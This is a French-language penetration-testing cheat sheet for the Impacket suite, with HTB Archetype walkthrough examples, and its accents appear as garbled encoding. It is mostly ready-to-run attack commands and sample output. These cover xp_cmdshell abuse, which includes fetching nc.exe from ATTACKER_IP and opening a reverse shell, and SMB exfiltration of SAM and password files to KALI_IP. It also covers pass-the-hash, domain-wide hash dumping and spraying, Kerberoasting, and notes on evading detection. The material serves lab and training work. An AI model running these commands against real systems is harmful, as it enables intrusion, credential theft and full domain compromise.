# ðŸ“¦ Impacket - Suite d'Outils Python

[â† Retour Ã  la table des matiÃ¨res](../README.md)

Impacket est une collection de classes Python pour travailler avec les protocoles rÃ©seau Windows. C'est un outil essentiel pour le pentest Active Directory et Windows.

---

## ðŸ“‹ Table des MatiÃ¨res
- [Installation](#installation)
- [Bases de DonnÃ©es](#bases-de-donnÃ©es)
  - [MSSQL Client](#mssqlclientpy---microsoft-sql-server-)
  - [MySQL](#mysql--alternative)
- [ExÃ©cution Ã  Distance](#exÃ©cution-Ã -distance)
  - [psexec.py](#psexecpy---shell-via-smb)
  - [wmiexec.py](#wmiexecpy---shell-via-wmi)
  - [smbexec.py](#smbexecpy---shell-via-smb-alternatif)
- [SMB](#smb)
  - [smbclient.py](#smbclientpy---client-smb)
  - [smbserver.py](#smbserverpy---serveur-smb-local)
- [Credential Dumping](#credential-dumping)
  - [secretsdump.py](#secretsdumppy---dump-de-credentials-)
- [Kerberos](#kerberos)
  - [GetNPUsers.py](#getnpuserspy---asreproast)
  - [GetUserSPNs.py](#getuserspnspy---kerberoasting)
  - [getTGT.py / getST.py](#gettgtpy--getstpy---tickets-kerberos)
- [Ã‰numÃ©ration](#Ã©numÃ©ration)
  - [lookupsid.py](#lookupsidpy---Ã©numÃ©ration-sid)
  - [rpcdump.py](#rpcdumppy---Ã©numÃ©ration-rpc)
- [NTLM Relay](#ntlm-relay)
  - [ntlmrelayx.py](#ntlmrelayxpy---relay-ntlm)
- [Tableau RÃ©capitulatif](#-tableau-rÃ©capitulatif)
- [Workflow d'Attaque](#-workflow-dattaque-type)

---

## Installation

```bash
# Kali Linux (prÃ©installÃ©)
apt update && apt install impacket-scripts

# Installation via pip
pip3 install impacket

# Installation depuis les sources (version dev)
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
pip3 install .
```

---

## ðŸ—„ï¸ Bases de DonnÃ©es

### **mssqlclient.py** - Microsoft SQL Server â­

Outil pour interagir avec Microsoft SQL Server (MSSQL). **C'est l'outil le plus utilisÃ© pour les bases de donnÃ©es dans les environnements Windows/Active Directory et les CTF/HTB**.

#### Connexions basiques
```bash
# Connexion avec credentials
impacket-mssqlclient username:password@IP

# Avec authentification Windows (Active Directory) â­ TrÃ¨s frÃ©quent
impacket-mssqlclient DOMAIN/username:password@IP -windows-auth

# Avec hash NTLM (Pass-the-Hash)
impacket-mssqlclient DOMAIN/username@IP -hashes :NTHASH -windows-auth

# Port personnalisÃ©
impacket-mssqlclient username:password@IP -port 1435

# Base de donnÃ©es spÃ©cifique
impacket-mssqlclient username:password@IP -db master
```

#### Exemple concret - HTB Archetype
```bash
# Connexion avec credentials trouvÃ©s
impacket-mssqlclient ARCHETYPE/sql_svc:M3g4c0rp123@10.129.95.187 -windows-auth

# Une fois connectÃ©, commandes SQL utiles :
SQL> SELECT @@version;                    # Version du serveur
SQL> SELECT name FROM sys.databases;      # Lister les bases de donnÃ©es
SQL> SELECT SYSTEM_USER;                  # Utilisateur actuel
SQL> SELECT IS_SRVROLEMEMBER('sysadmin'); # VÃ©rifier si sysadmin (1=oui, 0=non)
```

#### ExÃ©cution de commandes systÃ¨me (xp_cmdshell) â­
**C'est la fonctionnalitÃ© clÃ© pour l'exploitation via MSSQL !**

```bash
# Activer xp_cmdshell (nÃ©cessite droits sysadmin)
SQL> ENABLE_xp_cmdshell

# Ou manuellement :
SQL> EXEC sp_configure 'show advanced options', 1;
SQL> RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1;
SQL> RECONFIGURE;

# Ã‰numÃ©ration systÃ¨me
SQL> xp_cmdshell "whoami"
SQL> xp_cmdshell "hostname"
SQL> xp_cmdshell "net user"
SQL> xp_cmdshell "net localgroup administrators"

# Lire des fichiers
SQL> xp_cmdshell "type C:\Users\sql_svc\Desktop\user.txt"
SQL> xp_cmdshell "dir C:\Users\Administrator\Desktop"

# â­ PowerShell History - TRÃˆS IMPORTANT pour trouver des passwords!
SQL> xp_cmdshell "type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
# Exemple de rÃ©sultat : 
# net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
# â†’ Password admin trouvÃ©!

# Obtenir un reverse shell
# Sur Kali : nc -nvlp 4444
SQL> xp_cmdshell "powershell -c wget http://ATTACKER_IP/nc.exe -o C:\Windows\Temp\nc.exe"
SQL> xp_cmdshell "C:\Windows\Temp\nc.exe ATTACKER_IP 4444 -e cmd.exe"
```

#### Commandes SQL utiles pour Ã©numÃ©ration
```bash
# Ã‰numÃ©ration des bases de donnÃ©es
SQL> SELECT name FROM sys.databases;
SQL> SELECT name FROM master.sys.databases;

# Utiliser une base spÃ©cifique
SQL> USE database_name;

# Ã‰numÃ©ration des tables
SQL> SELECT * FROM INFORMATION_SCHEMA.TABLES;
SQL> SELECT table_name FROM information_schema.tables;

# Lire des tables (souvent contient des credentials)
SQL> SELECT * FROM users;
SQL> SELECT username, password FROM accounts;
SQL> SELECT * FROM dbo.users;

# Lire des fichiers systÃ¨me (si permissions)
SQL> SELECT * FROM OPENROWSET(BULK 'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS x;
```

#### Workflow complet MSSQL â†’ Shell Admin
```bash
# 1ï¸âƒ£ Connexion MSSQL
impacket-mssqlclient DOMAIN/sql_svc:password@IP -windows-auth

# 2ï¸âƒ£ VÃ©rifier privilÃ¨ges
SQL> SELECT IS_SRVROLEMEMBER('sysadmin');
# â†’ 1 = sysadmin (parfait!)

# 3ï¸âƒ£ Activer xp_cmdshell
SQL> ENABLE_xp_cmdshell

# 4ï¸âƒ£ Chercher credentials dans PowerShell history
SQL> xp_cmdshell "type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
# â†’ Trouve password admin : MEGACORP_4dm1n!!

# 5ï¸âƒ£ Utiliser Evil-WinRM ou PSExec pour shell admin
# Option A : WinRM (port 5985)
evil-winrm -i IP -u administrator -p 'MEGACORP_4dm1n!!'

# Option B : SMB (port 445)
impacket-psexec administrator:MEGACORP_4dm1n!!@IP

# 6ï¸âƒ£ Flag root
C:\> type C:\Users\Administrator\Desktop\root.txt
```

**ðŸ”— Liens avec exploitation :**
- â­ Guide complet : [Ã‰numÃ©ration MSSQL](../03-enumeration/mssql.md)
- Souvent combinÃ© avec **secretsdump.py** aprÃ¨s obtention de credentials
- Peut Ãªtre utilisÃ© pour **pivoting** vers d'autres machines du rÃ©seau
- Voir aussi : [Evil-WinRM](evil-winrm.md) pour obtenir un meilleur shell aprÃ¨s

**ðŸ’¡ Quand utiliser mssqlclient vs autres outils ?**
```
MSSQL (1433 ouvert) â†’ impacket-mssqlclient â†’ xp_cmdshell â†’ Trouver password
    â†“
WinRM (5985 ouvert) â†’ evil-winrm -i IP -u admin -p 'password'
    OU
SMB (445 ouvert)    â†’ impacket-psexec admin:password@IP
```

---

### **MySQL** âš ï¸ Alternative

âš ï¸ **Pas d'outil MySQL natif dans Impacket** - Impacket ne contient **PAS** d'outil MySQL.

**Pour MySQL, utilisez ces alternatives :**

#### Client MySQL standard
```bash
# Connexion basique
mysql -h IP -u username -p

# Sans SSL (souvent nÃ©cessaire)
mysql -h IP -u root --skip-ssl
mysql -h IP -u username --skip-ssl

# Sans mot de passe
mysql -h IP -u root
```

#### Via Metasploit
```bash
# ExÃ©cution de requÃªtes SQL
msfconsole
use auxiliary/admin/mysql/mysql_sql
set RHOSTS IP
set USERNAME root
set PASSWORD ''
set SQL SELECT * FROM mysql.user;
run

# Autres modules utiles
use auxiliary/admin/mysql/mysql_enum          # Ã‰numÃ©ration de la base
use auxiliary/scanner/mysql/mysql_login       # Bruteforce credentials
use auxiliary/scanner/mysql/mysql_hashdump    # Dump des hashes utilisateurs
```

**ðŸ”— Voir :** [Guide MySQL complet](../03-enumeration/mysql.md)

**ðŸ’¡ Pourquoi Impacket n'a pas d'outil MySQL ?**
- Impacket se concentre sur les protocoles Windows (SMB, WMI, RPC, Kerberos)
- MySQL est principalement utilisÃ© dans les environnements Linux/Unix
- MSSQL (Microsoft SQL Server) est l'Ã©quivalent Windows â†’ **mssqlclient.py** â­

---

## ðŸ–¥ï¸ ExÃ©cution Ã  Distance

### **psexec.py** - Shell via SMB

Obtenir un shell administrateur via SMB (port 445). Imite le cÃ©lÃ¨bre `psexec.exe` de Sysinternals.

#### Syntaxe basique
```bash
# Shell administrateur basique
impacket-psexec username:password@IP

# Avec domaine Active Directory
impacket-psexec DOMAIN/username:password@IP

# Avec hash NTLM (Pass-the-Hash) â­
impacket-psexec username@IP -hashes :NTHASH

# Avec hash LM:NTLM complet
impacket-psexec username@IP -hashes LMHASH:NTHASH

# Avec domaine et hash
impacket-psexec DOMAIN/username@IP -hashes :NTHASH
```

#### Exemples pratiques
```bash
# Exemple 1 : Connexion avec credentials trouvÃ©s
impacket-psexec administrator:MEGACORP_4dm1n!!@10.129.95.187

# Exemple 2 : Pass-the-Hash aprÃ¨s secretsdump
impacket-psexec administrator@10.129.95.187 -hashes :e19ccf75ee54e06b06a5907af13cef42

# Exemple 3 : Avec domaine Active Directory
impacket-psexec CORP.LOCAL/administrator:P@ssw0rd@10.10.10.100

# Exemple 4 : Shell puis exÃ©cution de commandes
C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
b91ccec3305e98240082d4474b848528
```

**ðŸ’¡ CaractÃ©ristiques :**
- âœ… CrÃ©e un service temporaire sur la cible (PSEXESVC)
- âœ… Shell interactif complet (`cmd.exe` en tant que SYSTEM)
- âœ… IdÃ©al pour obtenir un accÃ¨s initial rapide
- âš ï¸ Laisse des traces dans les logs Windows (Event ID 7045)
- âš ï¸ NÃ©cessite droits administrateur local
- âš ï¸ Requiert SMB accessible (port 445)

**ðŸ”— Alternatives :**
- Plus discret â†’ `wmiexec.py` (pas de service crÃ©Ã©)
- Plus stable â†’ `evil-winrm` si WinRM ouvert (port 5985)
- Plus furtif â†’ `smbexec.py` (pas de PSEXESVC)

---

### **wmiexec.py** - Shell via WMI

ExÃ©cution de commandes via WMI (Windows Management Instrumentation). **Plus discret que psexec** car ne crÃ©e pas de service.

#### Syntaxe
```bash
# Shell via WMI
impacket-wmiexec username:password@IP

# Avec domaine Active Directory
impacket-wmiexec DOMAIN/username:password@IP

# Avec hash NTLM (Pass-the-Hash) â­
impacket-wmiexec username@IP -hashes :NTHASH

# Avec domaine et hash
impacket-wmiexec DOMAIN/username@IP -hashes :NTHASH
```

#### Exemples pratiques
```bash
# Exemple 1 : Connexion aprÃ¨s avoir trouvÃ© credentials
impacket-wmiexec administrator:MEGACORP_4dm1n!!@10.129.95.187

# Exemple 2 : Pass-the-Hash
impacket-wmiexec administrator@10.129.95.187 -hashes :e19ccf75ee54e06b06a5907af13cef42

# Exemple 3 : Avec domaine
impacket-wmiexec CORP.LOCAL/admin:P@ssw0rd@DC01
```

**ðŸ’¡ Avantages par rapport Ã  psexec :**
- âœ… **Plus discret** - Ne crÃ©e pas de service Windows
- âœ… **Moins de logs** - Plus difficile Ã  dÃ©tecter
- âœ… Shell semi-interactif (affiche le rÃ©sultat de chaque commande)
- âœ… Utilise le port **135** (RPC/WMI) au lieu de 445
- âš ï¸ LÃ©gÃ¨rement plus lent que psexec (latence rÃ©seau)
- âš ï¸ Shell non complÃ¨tement interactif (pas de programmes interactifs)

**ðŸ”— Quand utiliser wmiexec ?**
- âœ… Environnements avec dÃ©tection EDR/AV active
- âœ… Quand SMB (445) est filtrÃ© mais WMI (135) est ouvert
- âœ… Pour rester sous le radar lors de pentests Red Team

**ðŸ”— Voir aussi :** [Evil-WinRM](evil-winrm.md) pour WinRM (encore plus stable)

---

### **smbexec.py** - Shell via SMB (alternatif)

Alternative Ã  psexec qui **ne crÃ©e pas de service Windows**. Utilise une technique diffÃ©rente pour l'exÃ©cution.

#### Syntaxe
```bash
# Shell via SMB
impacket-smbexec username:password@IP

# Avec domaine
impacket-smbexec DOMAIN/username:password@IP

# Avec hash NTLM (Pass-the-Hash)
impacket-smbexec username@IP -hashes :NTHASH

# Avec domaine et hash
impacket-smbexec DOMAIN/username@IP -hashes :NTHASH
```

#### Exemples pratiques
```bash
# Exemple 1 : Connexion basique
impacket-smbexec administrator:MEGACORP_4dm1n!!@10.129.95.187

# Exemple 2 : Pass-the-Hash
impacket-smbexec administrator@10.129.95.187 -hashes :e19ccf75ee54e06b06a5907af13cef42

# Exemple 3 : Avec domaine
impacket-smbexec CORP.LOCAL/admin:P@ssw0rd@10.10.10.50
```

**ðŸ’¡ DiffÃ©rences avec psexec :**
- âœ… **Ne crÃ©e pas de service** (plus discret que psexec)
- âœ… Moins de traces dans Event Logs (pas d'Event ID 7045)
- âš ï¸ CrÃ©e des **fichiers temporaires** sur le partage `ADMIN$`
- âš ï¸ Peut Ãªtre dÃ©tectÃ© par surveillance du partage ADMIN$
- âœ… MÃªme niveau d'accÃ¨s requis (administrateur local)
- âœ… Utilise le port 445 (SMB) comme psexec

**ðŸ’¡ Comparaison rapide :**
```
psexec    â†’ CrÃ©e service PSEXESVC (visible) â†’ Plus de logs
smbexec   â†’ Pas de service mais fichiers temporaires â†’ Logs moyens
wmiexec   â†’ Pas de service, pas de fichiers â†’ Moins de logs (le plus discret)
```

**ðŸ”— Quand utiliser smbexec ?**
- âœ… Quand vous voulez Ã©viter la crÃ©ation de services (dÃ©tection)
- âœ… Alternative si psexec Ã©choue
- âœ… Environnements oÃ¹ les services sont surveillÃ©s

---

## ðŸ“ SMB

### **smbclient.py** - Client SMB

Client SMB Python pour accÃ©der aux partages rÃ©seau Windows.

```bash
# Se connecter Ã  un hÃ´te
impacket-smbclient username:password@IP

# Lister les partages disponibles
impacket-smbclient username:password@IP -list

# Avec authentification nulle
impacket-smbclient guest@IP -no-pass
```

#### Commandes interactives
```bash
# Une fois connectÃ©
shares              # Lister les partages
use SHARE_NAME      # SÃ©lectionner un partage
ls                  # Lister les fichiers
cd directory        # Changer de dossier
get file.txt        # TÃ©lÃ©charger un fichier
put local.txt       # Uploader un fichier
```

**ðŸ”— Voir aussi :**
- [SMBClient standard](smbclient.md) - Version C/Linux
- [SMBMap](smbmap.md) - Ã‰numÃ©ration avancÃ©e
- [Ã‰numÃ©ration SMB](../03-enumeration/smb-samba.md)

---

### **smbserver.py** - Serveur SMB local

CrÃ©er un serveur SMB temporaire sur votre machine Kali pour exfiltrer/uploader des fichiers. **TrÃ¨s pratique pour les transferts de fichiers pendant un pentest !**

#### Syntaxe
```bash
# Serveur SMB basique (partage anonyme)
impacket-smbserver share /path/to/share -smb2support

# Avec authentification (requis sur certaines versions Windows)
impacket-smbserver share /path/to/share -smb2support -username user -password pass

# Exemple pratique - Partager le rÃ©pertoire courant
impacket-smbserver share $(pwd) -smb2support

# Avec authentification (contourner les restrictions Windows)
impacket-smbserver share $(pwd) -smb2support -username kali -password kali
```

#### Utilisation depuis Windows (cible compromise)
```cmd
# Lister le partage
net view \\KALI_IP

# Copier un fichier depuis Kali â†’ Windows (upload d'outils)
copy \\KALI_IP\share\nc.exe C:\Windows\Temp\nc.exe
copy \\KALI_IP\share\winPEAS.exe C:\Temp\winPEAS.exe
copy \\KALI_IP\share\mimikatz.exe C:\Temp\mimikatz.exe

# Exfiltrer un fichier depuis Windows â†’ Kali (download)
copy C:\Users\Admin\Desktop\flag.txt \\KALI_IP\share\flag.txt
copy C:\Users\Admin\Documents\passwords.txt \\KALI_IP\share\
copy C:\Windows\System32\config\SAM \\KALI_IP\share\SAM

# ExÃ©cuter directement depuis le partage (sans copie)
\\KALI_IP\share\mimikatz.exe
\\KALI_IP\share\nc.exe KALI_IP 4444 -e cmd.exe
```

#### Utilisation avec authentification (Windows rÃ©cents)
```cmd
# Sur Windows rÃ©cent, il faut d'abord s'authentifier
net use \\KALI_IP\share /user:kali kali

# Ensuite utilisation normale
copy \\KALI_IP\share\winPEAS.exe C:\Temp\
copy C:\Temp\secrets.txt \\KALI_IP\share\

# DÃ©connexion (optionnel)
net use \\KALI_IP\share /delete
```

#### Utilisation via PowerShell
```powershell
# Upload d'un outil
Copy-Item \\KALI_IP\share\nc.exe -Destination C:\Temp\nc.exe

# Download de fichiers
Copy-Item C:\Users\Admin\Desktop\*.txt -Destination \\KALI_IP\share\

# Exfiltration rÃ©cursive d'un dossier
Copy-Item -Recurse C:\Users\Admin\Documents\ \\KALI_IP\share\exfil\
```

**ðŸ’¡ Cas d'usage typiques :**
- âœ… **Upload d'outils** (Mimikatz, nc.exe, exploits, WinPEAS)
- âœ… **Exfiltration de donnÃ©es** (flags, passwords, SAM/SYSTEM, bases de donnÃ©es)
- âœ… **Alternative au serveur HTTP** Python (`python3 -m http.server`)
- âœ… **Fonctionne mÃªme avec Windows Defender actif** (parfois bloquÃ© par HTTP)
- âœ… **Plus stable pour les gros fichiers** que HTTP

**ðŸ”— Workflow typique d'upload/download :**
```bash
# 1ï¸âƒ£ Sur Kali : DÃ©marrer le serveur SMB
cd /opt/tools/windows
impacket-smbserver share $(pwd) -smb2support -username kali -password kali

# 2ï¸âƒ£ Via MSSQL xp_cmdshell (si pas encore de shell complet)
SQL> xp_cmdshell "net use \\KALI_IP\share /user:kali kali"
SQL> xp_cmdshell "copy \\KALI_IP\share\nc.exe C:\Temp\nc.exe"
SQL> xp_cmdshell "C:\Temp\nc.exe KALI_IP 4444 -e cmd.exe"

# 3ï¸âƒ£ Via Evil-WinRM (mÃ©thode alternative)
*Evil-WinRM* PS C:\> net use \\KALI_IP\share /user:kali kali
*Evil-WinRM* PS C:\> copy \\KALI_IP\share\winPEAS.exe C:\Temp\

# 4ï¸âƒ£ Via PSExec (aprÃ¨s avoir obtenu admin)
C:\> net use \\KALI_IP\share /user:kali kali
C:\> copy C:\Users\Administrator\Desktop\root.txt \\KALI_IP\share\

# 5ï¸âƒ£ Sur Kali : RÃ©cupÃ©rer les fichiers exfiltrÃ©s
ls -la
# â†’ root.txt, passwords.txt, etc.
```

**ðŸ’¡ Avantages par rapport Ã  HTTP :**
```
âœ… SMB (smbserver.py) :
   - Bidirectionnel natif (upload + download)
   - Pas besoin de commandes wget/curl
   - Copy/paste simple (copy \\IP\share\file)
   - Moins dÃ©tectÃ© par AV parfois

âŒ HTTP (python3 -m http.server) :
   - Unidirectionnel (download only)
   - Requiert wget/curl/certutil/etc.
   - Plus visible dans les logs web
   - DÃ©tectÃ© plus facilement par AV
```

**âš ï¸ DÃ©pannage courant :**
```bash
# Erreur "Access Denied" sur Windows 10/11 rÃ©cent
# â†’ Ajouter l'authentification :
impacket-smbserver share $(pwd) -smb2support -username kali -password kali

# Erreur "SMBv1 not supported"
# â†’ Toujours ajouter -smb2support

# Erreur "Network path not found"
# â†’ VÃ©rifier firewall sur Kali (port 445)
sudo ufw allow 445

# VÃ©rifier que le serveur Ã©coute
ss -tulpn | grep 445
```

---

## ðŸ”‘ Credential Dumping

### **secretsdump.py** - Dump de credentials â­

**Outil le plus puissant d'Impacket** pour extraire les hashes de mots de passe Windows (SAM, LSA, NTDS.dit). Essentiel pour le mouvement latÃ©ral et l'Ã©lÃ©vation de privilÃ¨ges.

#### Dump local (SAM + LSA)
```bash
# Avec credentials (â­ le plus courant)
impacket-secretsdump username:password@IP

# Avec domaine Active Directory
impacket-secretsdump DOMAIN/username:password@IP

# Avec hash NTLM (Pass-the-Hash) â­
impacket-secretsdump username@IP -hashes :NTHASH

# Avec domaine et hash
impacket-secretsdump DOMAIN/username@IP -hashes :NTHASH
```

#### Dump Active Directory (NTDS.dit)
```bash
# Dumper tous les hashes du domaine (Domain Controller) â­â­
impacket-secretsdump DOMAIN/username:password@DC_IP -just-dc

# Dump avec historique des mots de passe
impacket-secretsdump DOMAIN/username:password@DC_IP -just-dc -history

# Dump des Kerberos keys
impacket-secretsdump DOMAIN/username:password@DC_IP -just-dc -just-dc-ntlm

# Dump d'un utilisateur spÃ©cifique
impacket-secretsdump DOMAIN/username:password@DC_IP -just-dc-user administrator
```

#### Exemples pratiques
```bash
# Exemple 1 : Dump aprÃ¨s avoir obtenu credentials admin
impacket-secretsdump administrator:MEGACORP_4dm1n!!@10.129.95.187

# Exemple 2 : Pass-the-Hash pour dump
impacket-secretsdump administrator@10.129.95.187 -hashes :e19ccf75ee54e06b06a5907af13cef42

# Exemple 3 : Dump d'un Domain Controller (compromission totale du domaine)
impacket-secretsdump CORP.LOCAL/administrator:P@ssw0rd@DC01 -just-dc

# RÃ©sultat typique (exemple) :
[*] Dumping local SAM hashes (hashes locaux)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
sql_svc:1001:aad3b435b51404eeaad3b435b51404ee:b91ccec3305e98240082d4474b848528:::

[*] Dumping LSA Secrets (secrets stockÃ©s)
DPAPI_SYSTEM:01000000d08c9ddf0115d1118c7a00c04fc297eb...
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:a87f3a337d73085c45f9416be5787d86

[*] Dumping cached domain logon information (informations de connexion en cache)
CORP.LOCAL/john.doe:$DCC2$10240#john.doe#e4e938d12fe5974dc42a90120bd9c90f...

# Exemple 4 : RÃ©utiliser le hash (Pass-the-Hash) â­
impacket-psexec administrator@10.129.95.187 -hashes :e19ccf75ee54e06b06a5907af13cef42
# OU
impacket-wmiexec administrator@10.129.95.187 -hashes :e19ccf75ee54e06b06a5907af13cef42
```

#### Comprendre le format des hashes
```bash
# Format complet :
# username:RID:LM_hash:NTLM_hash:::
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
     â†‘        â†‘              â†‘                            â†‘
  Username   RID         Hash LM                    Hash NTLM
                     (souvent vide)              (celui Ã  utiliser!)
```

**ðŸ’¡ Formats de hash :**
- `aad3b435b51404ee` = Hash LM vide (dÃ©sactivÃ© par dÃ©faut depuis Windows Vista)
- Hash aprÃ¨s le dernier `:` = **Hash NTLM** (utilisable pour Pass-the-Hash) â­
- RID 500 = Compte Administrator local
- RID 501 = Compte Guest

**ðŸ’¡ Ce que dumpe secretsdump :**
1. **SAM (Security Account Manager)** : Comptes locaux Windows
2. **LSA Secrets** : Credentials cachÃ©s (comptes de service, DPAPI, etc.)
3. **Cached credentials** : Hashes de connexions domaine en cache
4. **NTDS.dit** (si DC) : **TOUS les comptes du domaine Active Directory** â­â­

**ðŸ”— Workflow typique (mouvement latÃ©ral) :**
```bash
# 1ï¸âƒ£ Obtenir accÃ¨s initial (exemple : via MSSQL)
impacket-mssqlclient DOMAIN/sql_svc:password@IP -windows-auth
SQL> ENABLE_xp_cmdshell
SQL> xp_cmdshell "type C:\Users\sql_svc\AppData\...\ConsoleHost_history.txt"
# â†’ Trouve password admin : MEGACORP_4dm1n!!

# 2ï¸âƒ£ Shell admin
impacket-psexec administrator:MEGACORP_4dm1n!!@IP

# 3ï¸âƒ£ Dump des hashes â­
impacket-secretsdump administrator:MEGACORP_4dm1n!!@IP
# â†’ Obtient hash NTLM : e19ccf75ee54e06b06a5907af13cef42

# 4ï¸âƒ£ Pass-the-Hash vers d'autres machines
impacket-psexec administrator@OTHER_MACHINE_IP -hashes :e19ccf75ee54e06b06a5907af13cef42

# 5ï¸âƒ£ Spray le hash sur tout le rÃ©seau
crackmapexec smb 10.10.10.0/24 -u administrator -H e19ccf75ee54e06b06a5907af13cef42 --continue-on-success

# 6ï¸âƒ£ Si admin sur le DC â†’ Dump NTDS.dit (game over!)
impacket-secretsdump DOMAIN/administrator@DC_IP -hashes :HASH -just-dc
# â†’ Tous les hashes du domaine = domaine compromis âœ…
```

**ðŸ”— Voir aussi :**
- [CrackMapExec](crackmapexec.md) - Pour spray automatisÃ© de hashes
- [Windows Privesc](../05-post-exploitation/windows-privesc.md) - Ã‰lÃ©vation de privilÃ¨ges avant dump
- [Pivoting](../09-pivoting/) - Utiliser les hashes pour mouvement latÃ©ral

---

## ðŸŽ« Kerberos

### **GetNPUsers.py** - ASREPRoast

Attaque contre les comptes Active Directory sans prÃ©-authentification Kerberos.

```bash
# Ã‰numÃ©ration sans credentials
impacket-GetNPUsers DOMAIN/ -usersfile users.txt -dc-ip DC_IP

# Avec credentials (Ã©numÃ©rer tous les comptes vulnÃ©rables)
impacket-GetNPUsers DOMAIN/username:password -dc-ip DC_IP

# Sauvegarder les hashes pour cracking
impacket-GetNPUsers DOMAIN/ -usersfile users.txt -dc-ip DC_IP -format hashcat
```

#### Cracker les hashes obtenus
```bash
# Avec Hashcat
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt

# Avec John
john --wordlist=/usr/share/wordlists/rockyou.txt asrep_hashes.txt
```

**ðŸ”— PrÃ©requis :** Comptes avec `DONT_REQ_PREAUTH` activÃ© (misconfiguration AD)

---

### **GetUserSPNs.py** - Kerberoasting

**Attaque Kerberoasting** : Demander des tickets Kerberos (TGS) pour les comptes de service (SPN), puis cracker les tickets hors ligne. â­ **TrÃ¨s efficace en pentest AD** car difficile Ã  dÃ©tecter.

#### Syntaxe
```bash
# Kerberoasting basique (â­ le plus courant)
impacket-GetUserSPNs DOMAIN/username:password -dc-ip DC_IP -request

# Sauvegarder les tickets pour cracking
impacket-GetUserSPNs DOMAIN/username:password -dc-ip DC_IP -request -outputfile kerberoast_hashes.txt

# Format Hashcat
impacket-GetUserSPNs DOMAIN/username:password -dc-ip DC_IP -request -outputfile hashes.txt

# Avec hash NTLM (Pass-the-Hash)
impacket-GetUserSPNs DOMAIN/username -dc-ip DC_IP -hashes :NTHASH -request

# Cibler un SPN spÃ©cifique
impacket-GetUserSPNs DOMAIN/username:password -dc-ip DC_IP -request-user sql_service
```

#### Exemples pratiques
```bash
# Exemple 1 : Kerberoasting avec credentials de base (utilisateur domaine standard)
impacket-GetUserSPNs CORP.LOCAL/john.doe:Summer2024! -dc-ip 10.10.10.100 -request -outputfile tgs.txt

# RÃ©sultat typique :
$krb5tgs$23$*sql_svc$CORP.LOCAL$MSSQLSvc/DC01.corp.local:1433*$a87f3a337d73...

# Exemple 2 : Lister les SPNs disponibles (sans extraire les tickets)
impacket-GetUserSPNs CORP.LOCAL/john.doe:Summer2024! -dc-ip 10.10.10.100

# RÃ©sultat :
ServicePrincipalName              Name      MemberOf  PasswordLastSet  LastLogon
MSSQLSvc/DC01.corp.local:1433     sql_svc   ...       2024-01-15       2024-02-01

# Exemple 3 : Avec Pass-the-Hash
impacket-GetUserSPNs CORP.LOCAL/john.doe -dc-ip 10.10.10.100 -hashes :e19ccf75ee54e06b06a5907af13cef42 -request
```

#### Cracker les TGS
```bash
# Avec Hashcat (mode 13100 pour Kerberos TGS-REP) â­
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt

# Options utiles
hashcat -m 13100 tgs.txt rockyou.txt --force
hashcat -m 13100 tgs.txt rockyou.txt --show  # Afficher les mots de passe crackÃ©s

# Avec John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast_hashes.txt

# Afficher les rÃ©sultats
john --show kerberoast_hashes.txt
```

#### Workflow complet Kerberoasting
```bash
# 1ï¸âƒ£ Obtenir credentials initiaux (phishing, password spray, etc.)
# User trouvÃ© : john.doe / Summer2024!

# 2ï¸âƒ£ Kerberoasting
impacket-GetUserSPNs CORP.LOCAL/john.doe:Summer2024! -dc-ip 10.10.10.100 -request -outputfile tgs.txt

# RÃ©sultat : 3 comptes de service trouvÃ©s
# - sql_svc (MSSQLSvc/DC01:1433)
# - iis_svc (HTTP/webapp.corp.local)
# - backup_svc (cifs/backup.corp.local)

# 3ï¸âƒ£ Cracker les tickets
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt

# RÃ©sultat aprÃ¨s quelques heures :
# sql_svc:P@ssw0rd123
# backup_svc:Backup2024!

# 4ï¸âƒ£ Utiliser les credentials de service pour escalade
impacket-psexec CORP.LOCAL/sql_svc:P@ssw0rd123@SQL-SERVER01

# 5ï¸âƒ£ Dump credentials sur le serveur SQL
impacket-secretsdump CORP.LOCAL/sql_svc:P@ssw0rd123@SQL-SERVER01

# 6ï¸âƒ£ Mouvement latÃ©ral avec les nouveaux hashes
impacket-psexec CORP.LOCAL/administrator@DC01 -hashes :NEW_HASH
```

**ðŸ’¡ Avantages du Kerberoasting :**
- âœ… **Pas besoin de droits Ã©levÃ©s** - N'importe quel utilisateur du domaine peut le faire
- âœ… **Difficile Ã  dÃ©tecter** - Trafic Kerberos normal
- âœ… **Cracking hors ligne** - Pas de risque de lockout de compte
- âœ… **Les TGS contiennent le hash du mot de passe** du compte de service
- âœ… Souvent les comptes de service ont des **mots de passe faibles** et **ne changent jamais**

**ðŸ’¡ Pourquoi Ã§a marche ?**
- Les comptes avec SPN (Service Principal Name) sont utilisÃ©s pour l'authentification Kerberos
- Quand vous demandez un ticket TGS, le DC l'encrypte avec le hash du compte de service
- Vous pouvez cracker ce ticket hors ligne pour rÃ©cupÃ©rer le mot de passe

**ðŸ’¡ DÃ©tection et dÃ©fense :**
- ðŸ›¡ï¸ Utiliser des **mots de passe trÃ¨s longs** (>25 caractÃ¨res) pour les comptes de service
- ðŸ›¡ï¸ Utiliser des **Group Managed Service Accounts (gMSA)** - mots de passe automatiques complexes
- ðŸ›¡ï¸ Monitorer les demandes TGS suspectes (Event ID 4769)
- ðŸ›¡ï¸ Limiter les privilÃ¨ges des comptes de service

**ðŸ”— Voir aussi :**
- [GetNPUsers.py](#getnpuserspy---asreproast) - ASREPRoast (attaque similaire mais sans credentials)
- [CrackMapExec](crackmapexec.md) - VÃ©rifier oÃ¹ les credentials de service sont valides
